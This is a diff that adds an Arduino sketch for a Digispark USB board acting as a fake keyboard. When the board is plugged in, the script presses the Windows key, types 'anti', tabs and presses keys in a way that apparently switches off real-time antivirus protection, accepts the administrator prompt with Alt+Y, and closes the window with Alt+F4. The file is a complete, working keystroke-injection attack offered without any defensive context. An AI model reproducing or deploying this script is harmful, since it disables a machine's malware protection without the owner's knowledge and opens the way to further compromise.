@@ -1,0 +1,35 @@
+#include "DigiKeyboard.h"
+
+
+void setup() {
+  // put your setup code here, to run once:
+
+DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT  ); // press the windows key
+DigiKeyboard.delay(2000); // wait a second
+DigiKeyboard.print("anti");
+DigiKeyboard.delay(2000); // wait a second
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(2000); 
+DigiKeyboard.sendKeyStroke(43);
+DigiKeyboard.delay(100); // wait a second
+DigiKeyboard.sendKeyStroke(43);
+DigiKeyboard.delay(100); // wait a second
+DigiKeyboard.sendKeyStroke(43);
+DigiKeyboard.delay(100); // wait a second
+DigiKeyboard.sendKeyStroke(43);
+DigiKeyboard.delay(100); // wait a second
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(1200); // wait a second
+DigiKeyboard.sendKeyStroke(KEY_SPACE);
+DigiKeyboard.delay(1200); // wait a second
+DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
+DigiKeyboard.delay(1200); // wait a second
+DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
+DigiKeyboard.delay(1200); // wait a second
+
+}
+
+void loop() {
+  // put your main code here, to run repeatedly:
+
+}
